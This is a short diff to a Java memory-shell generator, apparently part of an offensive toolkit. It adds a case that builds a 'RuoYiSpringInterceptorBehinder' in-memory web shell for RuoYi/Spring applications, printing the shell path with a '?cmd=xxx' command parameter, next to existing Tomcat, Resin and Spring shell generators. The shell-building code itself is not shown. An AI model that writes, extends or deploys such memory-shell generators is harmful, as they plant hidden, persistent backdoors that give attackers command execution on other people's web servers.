@@ -10,6 +10,7 @@ import javassist.CtClass;
 import javassist.NotFoundException;
 import org.memshell.resin.ResinListenerBehinder;
 import org.memshell.resin.ResinListenerCMD;
+import org.memshell.ruoyi.RuoYiSpringInterceptorBehinder;
 import org.memshell.spring.SpringInterceptorBehinder;
 import org.memshell.tomcat.TomcatListenerBehinder;
 import org.memshell.tomcat.TomcatListenerBehinderByLei;
@@ -95,6 +96,9 @@ public class TemplateUtils {
                 print("SpringInterceptorBehinder", path);
                 return SpringInterceptorBehinder.generateListenerMemShell(path);
             // 返回一个空的class,用于实现无需AbstractTranslet的打法
+            case "RuoYiSpringInterceptorBehinder":
+                print("RuoYiSpringInterceptorBehinder", path+"?cmd=xxx");
+                return RuoYiSpringInterceptorBehinder.generateListenerMemShell(path);
             case "NullClass":
                 return nullClass();
             default:
